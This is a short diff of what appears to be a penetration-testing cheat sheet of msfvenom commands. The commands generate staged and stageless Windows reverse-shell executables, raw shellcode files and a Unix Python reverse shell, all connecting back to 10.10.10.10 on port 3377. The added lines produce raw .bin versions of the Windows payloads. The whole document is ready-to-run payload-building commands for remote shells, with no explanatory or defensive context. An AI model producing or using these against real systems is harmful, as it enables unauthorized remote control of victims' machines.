@@ -3,9 +3,11 @@
 ## Windows
 #Stageless Payloads
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/shell.bin
 
 #Staged Payloads
 msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f exe > ~/reverse-shell/s-shell.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=3377 -f raw -o ~/reverse-shell/s-shell.bin
 
 ##Linux
 msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=3377 -f raw > ~/reverse-shell/shell.py
